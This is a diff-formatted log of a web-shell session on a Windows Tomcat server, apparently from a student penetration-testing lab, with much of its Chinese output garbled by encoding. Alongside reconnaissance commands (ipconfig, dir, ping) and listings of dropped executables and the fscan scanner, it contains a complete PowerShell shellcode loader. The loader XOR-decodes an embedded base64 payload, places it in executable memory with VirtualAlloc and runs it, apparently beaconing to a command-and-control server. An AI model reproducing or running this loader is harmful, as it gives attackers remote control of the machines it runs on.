@@ -1,0 +1,356 @@
+C:/webdata/apache-tomcat-8.5.88/bin/ >echo
+ECHO ���ڴ�״̬��
+C:/webdata/apache-tomcat-8.5.88/bin/ >echo 202200202064-黄炜浩
+
+202200202064-黄炜�?
+C:/webdata/apache-tomcat-8.5.88/bin/ >echo 202200202064 -huangweihao
+
+202200202064 -huangweihao
+C:/webdata/apache-tomcat-8.5.88/bin/ >
+
+NULL
+C:/webdata/apache-tomcat-8.5.88/bin/ >
+
+NULL
+C:/webdata/apache-tomcat-8.5.88/bin/ >
+
+NULL
+C:/webdata/apache-tomcat-8.5.88/bin/ >
+
+NULL
+C:/webdata/apache-tomcat-8.5.88/bin/ >ls
+
+'ls' �����ڲ����ⲿ���Ҳ���ǿ����еĳ���
+���������ļ���
+C:/webdata/apache-tomcat-8.5.88/bin/ >ipconfig
+
+Windows IP ����
+
+
+��̫�������� �������� 3:
+
+   �����ض��� DNS ��׺ . . . . . . . : 
+   �������� IPv6 ��ַ. . . . . . . . : fe80::ad2e:d4b6:400a:d6e9%15
+   IPv4 ��ַ . . . . . . . . . . . . : 192.0.2.51
+   ��������  . . . . . . . . . . . . : 255.255.255.0
+   Ĭ������. . . . . . . . . . . . . : 192.0.2.254
+
+��̫�������� �������� 2:
+
+   �����ض��� DNS ��׺ . . . . . . . : 
+   �������� IPv6 ��ַ. . . . . . . . : fe80::bcf5:7890:600e:6540%14
+   IPv4 ��ַ . . . . . . . . . . . . : 192.168.3.68
+   ��������  . . . . . . . . . . . . : 255.255.255.0
+   Ĭ������. . . . . . . . . . . . . : 192.168.3.1
+
+��������� isatap.{D4E20FAD-07DA-4B98-BC41-D1DE09176E00}:
+
+   ý��״̬  . . . . . . . . . . . . : ý���ѶϿ�
+   �����ض��� DNS ��׺ . . . . . . . : 
+
+��������� ��������* 2:
+
+   ý��״̬  . . . . . . . . . . . . : ý���ѶϿ�
+   �����ض��� DNS ��׺ . . . . . . . : 
+
+��������� 6TO4 Adapter:
+
+   �����ض��� DNS ��׺ . . . . . . . : 
+   IPv6 ��ַ . . . . . . . . . . . . : 2002:c000:233::c000:233
+   Ĭ������. . . . . . . . . . . . . : 2002:c058:6301::c058:6301
+
+��������� isatap.{EAB3B4EE-B708-4BC1-8402-48D22109F74E}:
+
+   ý��״̬  . . . . . . . . . . . . : ý���ѶϿ�
+   �����ض��� DNS ��׺ . . . . . . . :
+C:/webdata/apache-tomcat-8.5.88/bin/ >ipconfig
+
+Windows IP ����
+
+
+��̫�������� �������� 3:
+
+   �����ض��� DNS ��׺ . . . . . . . : 
+   �������� IPv6 ��ַ. . . . . . . . : fe80::ad2e:d4b6:400a:d6e9%15
+   IPv4 ��ַ . . . . . . . . . . . . : 192.0.2.51
+   ��������  . . . . . . . . . . . . : 255.255.255.0
+   Ĭ������. . . . . . . . . . . . . : 192.0.2.254
+
+��̫�������� �������� 2:
+
+   �����ض��� DNS ��׺ . . . . . . . : 
+   �������� IPv6 ��ַ. . . . . . . . : fe80::bcf5:7890:600e:6540%14
+   IPv4 ��ַ . . . . . . . . . . . . : 192.168.3.68
+   ��������  . . . . . . . . . . . . : 255.255.255.0
+   Ĭ������. . . . . . . . . . . . . : 192.168.3.1
+
+��������� isatap.{D4E20FAD-07DA-4B98-BC41-D1DE09176E00}:
+
+   ý��״̬  . . . . . . . . . . . . : ý���ѶϿ�
+   �����ض��� DNS ��׺ . . . . . . . : 
+
+��������� ��������* 2:
+
+   ý��״̬  . . . . . . . . . . . . : ý���ѶϿ�
+   �����ض��� DNS ��׺ . . . . . . . : 
+
+��������� 6TO4 Adapter:
+
+   �����ض��� DNS ��׺ . . . . . . . : 
+   IPv6 ��ַ . . . . . . . . . . . . : 2002:c000:233::c000:233
+   Ĭ������. . . . . . . . . . . . . : 2002:c058:6301::c058:6301
+
+��������� isatap.{EAB3B4EE-B708-4BC1-8402-48D22109F74E}:
+
+   ý��״̬  . . . . . . . . . . . . : ý���ѶϿ�
+   �����ض��� DNS ��׺ . . . . . . . :
+C:/webdata/apache-tomcat-8.5.88/bin/ >pwd
+
+argsCount <=0
+C:/webdata/apache-tomcat-8.5.88/bin/ >chdir
+argsCount <=0
+C:/webdata/apache-tomcat-8.5.88/bin/ >
+
+NULL
+C:/webdata/apache-tomcat-8.5.88/bin/ >dir
+
+������ C �еľ�û�б�ǩ��
+ ������к��� BCB4-6D0B
+
+ C:\webdata\apache-tomcat-8.5.88\bin ��Ŀ¼
+
+2024/12/21  02:11    <DIR>          .
+2024/12/21  02:11    <DIR>          ..
+2024/12/21  02:10            17,920 202200202064-huangweihao.exe
+2024/12/21  01:56            17,920 202200202070-xiaoxuan.exe
+2024/12/21  01:42            19,456 202200202077-suguobin.exe
+2024/12/21  01:24         3,920,880 202200202094-linjiawei.exe
+2024/12/21  02:11            17,920 202200202097-xtiangtiancheng.exe
+2024/12/21  02:05           288,256 202200202117-lizixu.exe
+2023/04/14  20:16            36,717 bootstrap.jar
+2023/04/14  20:16             1,703 catalina-tasks.xml
+2023/04/14  20:16            16,852 catalina.bat
+2023/04/14  20:16            25,323 catalina.sh
+2023/04/14  20:16             2,123 ciphers.bat
+2023/04/14  20:16             1,997 ciphers.sh
+2023/04/14  20:16            25,765 commons-daemon.jar
+2023/04/14  20:16             2,040 configtest.bat
+2023/04/14  20:16             1,922 configtest.sh
+2023/04/14  20:16             9,100 daemon.sh
+2023/04/14  20:16             2,091 digest.bat
+2023/04/14  20:16             1,965 digest.sh
+2024/12/21  01:23           206,336 libcef.dll
+2024/12/18  21:30            19,968 QAXCMSע�ἰϵͳʹ��˵��.docx
+2024/12/21  01:23           429,686 readme.jpg
+2024/12/19  00:37           832,896 report.docx
+2023/04/14  20:16             9,144 service.bat
+2023/04/14  20:16             3,814 setclasspath.bat
+2023/04/14  20:16             4,317 setclasspath.sh
+2023/04/14  20:16             2,020 shutdown.bat
+2023/04/14  20:16             1,902 shutdown.sh
+2024/12/21  01:23         3,920,880 SocialClubHelper.exe
+2023/04/14  20:16             2,022 startup.bat
+2023/04/14  20:16             1,904 startup.sh
+2023/04/14  20:16         2,616,320 tcnative-1.dll
+2023/04/14  20:16            52,826 tomcat-juli.jar
+2023/04/14  20:16           145,424 tomcat8.exe
+2023/04/14  20:16           129,040 tomcat8w.exe
+2023/04/14  20:16             4,574 tool-wrapper.bat
+2023/04/14  20:16             5,540 tool-wrapper.sh
+2023/04/14  20:16             2,026 version.bat
+2023/04/14  20:16             1,908 version.sh
+              38 ���ļ�     12,802,497 �ֽ�
+               2 ��Ŀ¼ 33,489,944,576 �����ֽ�
+C:/webdata/apache-tomcat-8.5.88/bin/ >./202200202064-hangweihao.exe
+
+'.' �����ڲ����ⲿ���Ҳ���ǿ����еĳ���
+���������ļ���
+C:/webdata/apache-tomcat-8.5.88/bin/ > Set-StrictMode -Version 2
+
+function func_get_proc_address {
+	Param ($var_module, $var_procedure)		
+	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
+	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
+}
+
+function func_get_delegate_type {
+	Param (
+		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
+		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
+	)
+
+	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
+	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')
+
+	return $var_type_builder.CreateType()
+}
+
+If ([IntPtr]::size -eq 8) {
+	[Byte[]]$var_code = [System.Convert]::FromBase64String('32ugx9PL6yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEPA2Li6i5iIuLBznFicmuocQOoYR9rIvNFols7KCFWUaijqyMjI2um41dEayLzc6hrO2eoYwNqIvPAdWvc6mKoF6trIvVuEuprEuOPYuLqLmIi4hvDVtJvIG8HK2Ya8lb7e2eoYwdqIvNFYqgva2eoYz9qIvNiqCerayLzYntie316eWJ7YnpieWugzwNicdzDe2J6eWuoMcps3Nzcfkkjap1USk1KTUZXI2J1aqrFb6rSYplvVAUk3PZrEuprEvFuEuNuEupic2JzYpkZdVqE3PbIUHlrquJimyYEIyNuEupicmJySSBicmKZdKq85dz2yHp4a6riaxLxaqr7bhLqcUsjIWOncXFimch2DRjc9muq5Wug4HNJKXxrqtJrqvlq5OPc3NzcbhLqcXFimQ4lO1jc9qbjLKa+IiMja9zsLKevIiMjyPDKxyIjI8uB3NzcDElSVkZRWg4QDRANEQ1QT0pODU5KTQ1JUCO+T1ahitDWh1vyPXNs55F5yjq3SCdLyoyVYHqjOhfEPFeuHrPajKiSb9gwIh3opm73qxk8QSNiQEBGU1cZA1dGW1cMS1dOTw9CU1NPSkBCV0pMTQxbS1dOTwhbTk8PQlNTT0pAQldKTE0MW05PGFIeEw0aDwkMCRhSHhMNGy4pYkBARlNXDm9CTURWQkRGGQNGTQ52cA9GTRhSHhMNFi4pcUZFRlFGURkDS1dXUxkMDEBMR0YNSVJWRlFaDUBMTgwuKWJAQEZTVw5mTUBMR0pNRBkDRFlKUw8DR0ZFT0JXRi4pdlBGUQ5iREZNVxkDbkxZSk9PQgwWDRMDC3RKTUdMVFADbXcDFQ0QGAN3UUpHRk1XDBQNExgDUVUZEhINEwoDT0pIRgNkRkBITC4pI8ZFuXQuGbKg0AXhLMys2irnsw/f4VxjK63+5Ll2ig4aHWwsJPP66bDKsOrb9EpI3z43jd+PYnojYp3TloF13PZrEuqZIyNjI2KbIzMjI2KaYyMjI2KZe4dwxtz2a7BwcGuqxGuq0muq+WKbIwMjI2qq2mKZMbWqwdz2a6DnA6bjV5VFqCRrIuCm41b0e3t7ayaMLCMjc+DLvN7c3BISGw0RFg0aEg0SFhIjJtbCIw==')
+
+	for ($x = 0; $x -lt $var_code.Count; $x++) {
+		$var_code[$x] = $var_code[$x] -bxor 35
+	}
+
+	$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
+	$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
+	[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)
+
+	$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
+	$var_runme.Invoke([IntPtr]::Zero)
+}
+
+
+'Set-StrictMode' �����ڲ����ⲿ���Ҳ���ǿ����еĳ���
+���������ļ���
+C:/webdata/apache-tomcat-8.5.88/bin/ >
+NULL
+C:/webdata/apache-tomcat-8.5.88/bin/ >
+
+NULL
+C:/webdata/apache-tomcat-8.5.88/bin/ >
+
+NULL
+C:/webdata/apache-tomcat-8.5.88/bin/ >dir
+������ C �еľ�û�б�ǩ��
+ ������к��� BCB4-6D0B
+
+ C:\webdata\apache-tomcat-8.5.88\bin ��Ŀ¼
+
+2024/12/21  02:30    <DIR>          .
+2024/12/21  02:30    <DIR>          ..
+2024/12/21  02:29            17,920 202200202025-fangxiang.exe
+2024/12/21  02:29            17,920 202200202064-huangweihao.exe
+2024/12/21  01:56            17,920 202200202070-xiaoxuan.exe
+2024/12/21  01:42            19,456 202200202077-suguobin.exe
+2024/12/21  01:24         3,920,880 202200202094-linjiawei.exe
+2024/12/21  02:23           288,256 202200202097-xiangtiancheng.exe
+2024/12/21  02:05           288,256 202200202117-lizixu.exe
+2023/04/14  20:16            36,717 bootstrap.jar
+2023/04/14  20:16             1,703 catalina-tasks.xml
+2023/04/14  20:16            16,852 catalina.bat
+2023/04/14  20:16            25,323 catalina.sh
+2023/04/14  20:16             2,123 ciphers.bat
+2023/04/14  20:16             1,997 ciphers.sh
+2023/04/14  20:16            25,765 commons-daemon.jar
+2023/04/14  20:16             2,040 configtest.bat
+2023/04/14  20:16             1,922 configtest.sh
+2023/04/14  20:16             9,100 daemon.sh
+2023/04/14  20:16             2,091 digest.bat
+2023/04/14  20:16             1,965 digest.sh
+2024/12/21  02:30         2,097,152 f.exe
+2024/12/21  02:25        25,359,872 fscan.exe
+2024/12/21  01:23           206,336 libcef.dll
+2024/12/18  21:30            19,968 QAXCMSע�ἰϵͳʹ��˵��.docx
+2024/12/21  01:23           429,686 readme.jpg
+2024/12/19  00:37           832,896 report.docx
+2023/04/14  20:16             9,144 service.bat
+2023/04/14  20:16             3,814 setclasspath.bat
+2023/04/14  20:16             4,317 setclasspath.sh
+2023/04/14  20:16             2,020 shutdown.bat
+2023/04/14  20:16             1,902 shutdown.sh
+2024/12/21  01:23         3,920,880 SocialClubHelper.exe
+2023/04/14  20:16             2,022 startup.bat
+2023/04/14  20:16             1,904 startup.sh
+2023/04/14  20:16         2,616,320 tcnative-1.dll
+2023/04/14  20:16            52,826 tomcat-juli.jar
+2023/04/14  20:16           145,424 tomcat8.exe
+2023/04/14  20:16           129,040 tomcat8w.exe
+2023/04/14  20:16             4,574 tool-wrapper.bat
+2023/04/14  20:16             5,540 tool-wrapper.sh
+2023/04/14  20:16             2,026 version.bat
+2023/04/14  20:16             1,908 version.sh
+              41 ���ļ�     40,547,777 �ֽ�
+               2 ��Ŀ¼ 30,869,950,464 �����ֽ�
+C:/webdata/apache-tomcat-8.5.88/bin/ >
+
+NULL
+C:/webdata/apache-tomcat-8.5.88/bin/ >202200202064-huangweihao
+
+C:/webdata/apache-tomcat-8.5.88/bin/ >202200202077-suguobin.exe
+
+
+C:/webdata/apache-tomcat-8.5.88/bin/ >ipconfig
+Windows IP ����
+
+
+��̫�������� �������� 3:
+
+   �����ض��� DNS ��׺ . . . . . . . : 
+   �������� IPv6 ��ַ. . . . . . . . : fe80::ad2e:d4b6:400a:d6e9%15
+   IPv4 ��ַ . . . . . . . . . . . . : 192.0.2.51
+   ��������  . . . . . . . . . . . . : 255.255.255.0
+   Ĭ������. . . . . . . . . . . . . : 192.0.2.254
+
+��̫�������� �������� 2:
+
+   �����ض��� DNS ��׺ . . . . . . . : 
+   �������� IPv6 ��ַ. . . . . . . . : fe80::bcf5:7890:600e:6540%14
+   IPv4 ��ַ . . . . . . . . . . . . : 192.168.3.68
+   ��������  . . . . . . . . . . . . : 255.255.255.0
+   Ĭ������. . . . . . . . . . . . . : 192.168.3.1
+
+��������� isatap.{D4E20FAD-07DA-4B98-BC41-D1DE09176E00}:
+
+   ý��״̬  . . . . . . . . . . . . : ý���ѶϿ�
+   �����ض��� DNS ��׺ . . . . . . . : 
+
+��������� ��������* 2:
+
+   ý��״̬  . . . . . . . . . . . . : ý���ѶϿ�
+   �����ض��� DNS ��׺ . . . . . . . : 
+
+��������� 6TO4 Adapter:
+
+   �����ض��� DNS ��׺ . . . . . . . : 
+   IPv6 ��ַ . . . . . . . . . . . . : 2002:c000:233::c000:233
+   Ĭ������. . . . . . . . . . . . . : 2002:c058:6301::c058:6301
+
+��������� isatap.{EAB3B4EE-B708-4BC1-8402-48D22109F74E}:
+
+   ý��״̬  . . . . . . . . . . . . : ý���ѶϿ�
+   �����ض��� DNS ��׺ . . . . . . . :
+C:/webdata/apache-tomcat-8.5.88/bin/ >
+
+NULL
+C:/webdata/apache-tomcat-8.5.88/bin/ >
+
+NULL
+C:/webdata/apache-tomcat-8.5.88/bin/ >
+
+NULL
+C:/webdata/apache-tomcat-8.5.88/bin/ >
+
+NULL
+C:/webdata/apache-tomcat-8.5.88/bin/ >
+
+NULL
+C:/webdata/apache-tomcat-8.5.88/bin/ >
+
+NULL
+C:/webdata/apache-tomcat-8.5.88/bin/ >
+
+NULL
+C:/webdata/apache-tomcat-8.5.88/bin/ >
+
+NULL
+C:/webdata/apache-tomcat-8.5.88/bin/ >
+
+NULL
+C:/webdata/apache-tomcat-8.5.88/bin/ >
+
+NULL
+C:/webdata/apache-tomcat-8.5.88/bin/ >ping www.bing.com
+
+���� Ping china.bing123.com [202.89.233.101] ���� 32 �ֽڵ�����:
+���� 202.89.233.101 �Ļظ�: �ֽ�=32 ʱ��=52ms TTL=110
+���� 202.89.233.101 �Ļظ�: �ֽ�=32 ʱ��=51ms TTL=110
+���� 202.89.233.101 �Ļظ�: �ֽ�=32 ʱ��=57ms TTL=110
+���� 202.89.233.101 �Ļظ�: �ֽ�=32 ʱ��=50ms TTL=110
+
+202.89.233.101 �� Ping ͳ����Ϣ:
+    ���ݰ�: �ѷ��� = 4���ѽ��� = 4����ʧ = 0 (0% ��ʧ)��
+�����г̵Ĺ���ʱ��(�Ժ���Ϊ��λ):
+    ��� = 50ms��� = 57ms��ƽ�� = 52ms
